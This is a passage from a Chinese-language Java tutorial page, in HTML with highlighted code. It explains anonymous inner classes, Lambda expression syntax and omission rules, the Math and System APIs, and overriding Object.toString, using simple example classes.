直接调用方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="1-5-匿名内部类在开发中的使用"><a href="#1-5-匿名内部类在开发中的使用" class="headerlink" title="1.5 匿名内部类在开发中的使用"></a>1.5 匿名内部类在开发中的使用</h3><ul><li>匿名内部类在开发中的使用 <ul><li>当发现某个方法需要，接口或抽象类的子类对象，我们就可以传递一个匿名内部类过去，来简化传统的代码</li></ul></li><li> 代码： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    游泳接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Swimming</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestSwimming</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        goSwimming(<span class="keyword">new</span> Swimming() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;铁汁, 我们去游泳吧&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用接口的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">goSwimming</span><span class="params">(Swimming swimming)</span></span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Swimming swim = new Swimming() &#123;</span></span><br><span class="line"><span class="comment">                @Override</span></span><br><span class="line"><span class="comment">                public void swim() &#123;</span></span><br><span class="line"><span class="comment">                    System.out.println(&quot;铁汁, 我们去游泳吧&quot;);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        swimming.swim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="2-Lambda表达式"><a href="#2-Lambda表达式" class="headerlink" title="2.Lambda表达式"></a>2.Lambda表达式</h2><h3 id="2-1体验Lambda表达式"><a href="#2-1体验Lambda表达式" class="headerlink" title="2.1体验Lambda表达式"></a>2.1体验Lambda表达式</h3><ul><li> 演示 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    游泳接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Swimming</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestSwimming</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 通过匿名内部类实现</span></span><br><span class="line">        goSwimming(<span class="keyword">new</span> Swimming() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;铁汁, 我们去游泳吧&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*  通过Lambda表达式实现</span></span><br><span class="line"><span class="comment">            理解: 对于Lambda表达式, 对匿名内部类进行了优化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        goSwimming(() -&gt; System.out.println(<span class="string">&quot;铁汁, 我们去游泳吧&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用接口的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">goSwimming</span><span class="params">(Swimming swimming)</span> </span>&#123;</span><br><span class="line">        swimming.swim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 函数式编程思想概述<br>在数学中，函数就是有输入量、输出量的一套计算方案，也就是“拿数据做操作”<br>面向对象思想强调“必须通过对象的形式来做事情”<br>函数式思想则尽量忽略面向对象的复杂语法：“强调做什么，而不是以什么形式去做”<br>而我们要学习的Lambda表达式就是函数式思想的体现 </li></ul><h3 id="2-2Lambda表达式的标准格式"><a href="#2-2Lambda表达式的标准格式" class="headerlink" title="2.2Lambda表达式的标准格式"></a>2.2Lambda表达式的标准格式</h3><ul><li>格式：<br>  (形式参数) -&gt; {代码块} <ul><li>形式参数：如果有多个参数，参数之间用逗号隔开；如果没有参数，留空即可</li><li>-&gt;：由英文中画线和大于符号组成，固定写法。代表指向动作</li><li>代码块：是我们具体要做的事情，也就是以前我们写的方法体内容</li></ul></li><li>组成Lambda表达式的三要素： <ul><li>形式参数，箭头，代码块</li></ul></li></ul><h3 id="2-3Lambda表达式练习1"><a href="#2-3Lambda表达式练习1" class="headerlink" title="2.3Lambda表达式练习1"></a>2.3Lambda表达式练习1</h3><ul><li>Lambda表达式的使用前提 <ul><li>有一个接口</li><li>接口中有且仅有一个抽象方法</li></ul></li><li>练习描述<br>  无参无返回值抽象方法的练习 </li><li>操作步骤 <ul><li>定义一个接口(Eatable)，里面定义一个抽象方法：void eat();</li><li>定义一个测试类(EatableDemo)，在测试类中提供两个方法 <ul><li>一个方法是：useEatable(Eatable e)</li><li>一个方法是主方法，在主方法中调用useEatable方法</li></ul></li></ul></li><li> 代码 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Eatable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EatableImpl</span> <span class="keyword">implements</span> <span class="title">Eatable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;一天一苹果，医生远离我&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EatableDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//在主方法中调用useEatable方法</span></span><br><span class="line">        Eatable e = <span class="keyword">new</span> EatableImpl();</span><br><span class="line">        useEatable(e);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//匿名内部类</span></span><br><span class="line">        useEatable(<span class="keyword">new</span> Eatable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;一天一苹果，医生远离我&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Lambda表达式</span></span><br><span class="line">        useEatable(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;一天一苹果，医生远离我&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">useEatable</span><span class="params">(Eatable e)</span> </span>&#123;</span><br><span class="line">        e.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-4Lambda表达式练习2"><a href="#2-4Lambda表达式练习2" class="headerlink" title="2.4Lambda表达式练习2"></a>2.4Lambda表达式练习2</h3><ul><li> 练习描述<br>有参无返回值抽象方法的练习 </li><li>操作步骤 <ul><li>定义一个接口(Flyable)，里面定义一个抽象方法：void fly(String s);</li><li>定义一个测试类(FlyableDemo)，在测试类中提供两个方法 <ul><li>一个方法是：useFlyable(Flyable f)</li><li>一个方法是主方法，在主方法中调用useFlyable方法</li></ul></li></ul></li><li> 代码 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Flyable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fly</span><span class="params">(String s)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlyableDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//在主方法中调用useFlyable方法</span></span><br><span class="line">        <span class="comment">//匿名内部类</span></span><br><span class="line">        useFlyable(<span class="keyword">new</span> Flyable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">                System.out.println(s);</span><br><span class="line">                System.out.println(<span class="string">&quot;飞机自驾游&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;--------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Lambda</span></span><br><span class="line">        useFlyable((String s) -&gt; &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">            System.out.println(<span class="string">&quot;飞机自驾游&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">useFlyable</span><span class="params">(Flyable f)</span> </span>&#123;</span><br><span class="line">        f.fly(<span class="string">&quot;风和日丽，晴空万里&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-5Lambda表达式练习3"><a href="#2-5Lambda表达式练习3" class="headerlink" title="2.5Lambda表达式练习3"></a>2.5Lambda表达式练习3</h3><ul><li> 练习描述<br>有参有返回值抽象方法的练习 </li><li>操作步骤 <ul><li>定义一个接口(Addable)，里面定义一个抽象方法：int add(int x,int y);</li><li>定义一个测试类(AddableDemo)，在测试类中提供两个方法 <ul><li>一个方法是：useAddable(Addable a)</li><li>一个方法是主方法，在主方法中调用useAddable方法</li></ul></li></ul></li><li> 代码 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Addable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddableDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//在主方法中调用useAddable方法</span></span><br><span class="line">        useAddable((<span class="keyword">int</span> x,<span class="keyword">int</span> y) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> x + y;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">useAddable</span><span class="params">(Addable a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = a.add(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-6Lambda表达式的省略模式"><a href="#2-6Lambda表达式的省略模式" class="headerlink" title="2.6Lambda表达式的省略模式"></a>2.6Lambda表达式的省略模式</h3><ul><li>省略的规则 <ul><li>参数类型可以省略。但是有多个参数的情况下，不能只省略一个</li><li>如果参数有且仅有一个，那么小括号可以省略</li><li>如果代码块的语句只有一条，可以省略大括号和分号，和return关键字</li></ul></li><li> 代码演示 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Addable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Flyable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fly</span><span class="params">(String s)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LambdaDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        useAddable((int x,int y) -&gt; &#123;</span></span><br><span class="line"><span class="comment">//            return x + y;</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line">        <span class="comment">//参数的类型可以省略</span></span><br><span class="line">        useAddable((x, y) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> x + y;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        useFlyable((String s) -&gt; &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(s);</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line">        <span class="comment">//如果参数有且仅有一个，那么小括号可以省略</span></span><br><span class="line"><span class="comment">//        useFlyable(s -&gt; &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(s);</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果代码块的语句只有一条，可以省略大括号和分号</span></span><br><span class="line">        useFlyable(s -&gt; System.out.println(s));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果代码块的语句只有一条，可以省略大括号和分号，如果有return，return也要省略掉</span></span><br><span class="line">        useAddable((x, y) -&gt; x + y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">useFlyable</span><span class="params">(Flyable f)</span> </span>&#123;</span><br><span class="line">        f.fly(<span class="string">&quot;风和日丽，晴空万里&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">useAddable</span><span class="params">(Addable a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = a.add(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-7Lambda表达式的使用前提"><a href="#2-7Lambda表达式的使用前提" class="headerlink" title="2.7Lambda表达式的使用前提"></a>2.7Lambda表达式的使用前提</h3><ul><li>使用Lambda必须要有接口</li><li>并且要求接口中有且仅有一个抽象方法</li></ul><h3 id="2-8Lambda表达式和匿名内部类的区别"><a href="#2-8Lambda表达式和匿名内部类的区别" class="headerlink" title="2.8Lambda表达式和匿名内部类的区别"></a>2.8Lambda表达式和匿名内部类的区别</h3><ul><li>所需类型不同 <ul><li>匿名内部类：可以是接口，也可以是抽象类，还可以是具体类</li><li>Lambda表达式：只能是接口</li></ul></li><li>使用限制不同 <ul><li>如果接口中有且仅有一个抽象方法，可以使用Lambda表达式，也可以使用匿名内部类</li><li>如果接口中多于一个抽象方法，只能使用匿名内部类，而不能使用Lambda表达式</li></ul></li><li>实现原理不同 <ul><li>匿名内部类：编译之后，产生一个单独的.class字节码文件</li><li>Lambda表达式：编译之后，没有一个单独的.class字节码文件。对应的字节码会在运行的时候动态生成</li></ul></li></ul><h2 id="3-API"><a href="#3-API" class="headerlink" title="3.API"></a>3.API</h2><h3 id="3-1-API概述"><a href="#3-1-API概述" class="headerlink" title="3.1 API概述"></a>3.1 API概述</h3><ul><li>什么是API<br>  API (Application Programming Interface) ：应用程序编程接口 </li><li>java中的API<br>  指的就是 JDK 中提供的各种功能的 Java类，这些类将底层的实现封装了起来，我们不需要关心这些类是如何实现的，只需要学习这些类如何使用即可，我们可以通过帮助文档来学习这些API如何使用。 </li></ul><h3 id="3-2-如何使用API帮助文档"><a href="#3-2-如何使用API帮助文档" class="headerlink" title="3.2 如何使用API帮助文档"></a>3.2 如何使用API帮助文档</h3><ul><li>4.常用API</li></ul><h3 id="4-1-Math"><a href="#4-1-Math" class="headerlink" title="4.1 Math"></a>4.1 Math</h3><ul><li>1、Math类概述 <ul><li>Math 包含执行基本数字运算的方法</li></ul></li><li>2、Math中方法的调用方式 <ul><li>Math类中无构造方法，但内部的方法都是静态的，则可以通过   <strong>类名.进行调用</strong></li></ul></li><li> 3、Math类的常用方法  <table><thead><tr><th>方法名    方法名</th><th>说明</th></tr></thead><tbody><tr><td>public static int   abs(int a)</td><td>返回参数的绝对值</td></tr><tr><td>public static double ceil(double a)</td><td>返回大于或等于参数的最小double值，等于一个整数</td></tr><tr><td>public static double floor(double a)</td><td>返回小于或等于参数的最大double值，等于一个整数</td></tr><tr><td>public   static int round(float a)</td><td>按照四舍五入返回最接近参数的int</td></tr><tr><td>public static int   max(int a,int b)</td><td>返回两个int值中的较大值</td></tr><tr><td>public   static int min(int a,int b)</td><td>返回两个int值中的较小值</td></tr><tr><td>public   static double pow (double a,double b)</td><td>返回a的b次幂的值</td></tr><tr><td>public   static double random()</td><td>返回值为double的正值，[0.0,1.0)</td></tr></tbody></table></li></ul><h3 id="4-2-System"><a href="#4-2-System" class="headerlink" title="4.2 System"></a>4.2 System</h3><ul><li><p> System类的常用方法  </p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>public   static void exit(int status)</td><td>终止当前运行的   Java   虚拟机，非零表示异常终止</td></tr><tr><td>public   static long currentTimeMillis()</td><td>返回当前时间(以毫秒为单位)</td></tr></tbody></table></li><li><p>代码 </p><ul><li>需求：在控制台输出1-10000，计算这段代码执行了多少毫秒<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SystemDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取开始的时间节点</span></span><br><span class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10000</span>; i++) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取代码运行结束后的时间节点</span></span><br><span class="line">        <span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;共耗时：&quot;</span> + (end - start) + <span class="string">&quot;毫秒&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="4-3-Object类的toString方法"><a href="#4-3-Object类的toString方法" class="headerlink" title="4.3 Object类的toString方法"></a>4.3 Object类的toString方法</h3><ul><li>Object类概述 <ul><li>Object 是类层次结构的根，每个类都可以将 Object 作为超类。所有类都直接或者间接的继承自该类，换句话说，该类所具备的方法，所有类都会有一份</li></ul></li><li>查看方法源码的方式 <ul><li>选中方法，按下Ctrl + B</li></ul></li><li><h2 id="重写toString方法的方式"><a href="#重写toString方法的方式" class="headerlink" title="重写toString方法的方式 "></a>重写toString方法的方式 </h2><pre><code>1. Alt + Insert 选择toString</code></pre><ul><li><ol><li>在类的空白区域，右键 -&gt; Generate -&gt; 选择toString</li></ol></li></ul></li><li>toString方法的作用： <ul><li>以良好的格式，更方便的展示对象中的属性值</li></ul></li><li> 代码： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span 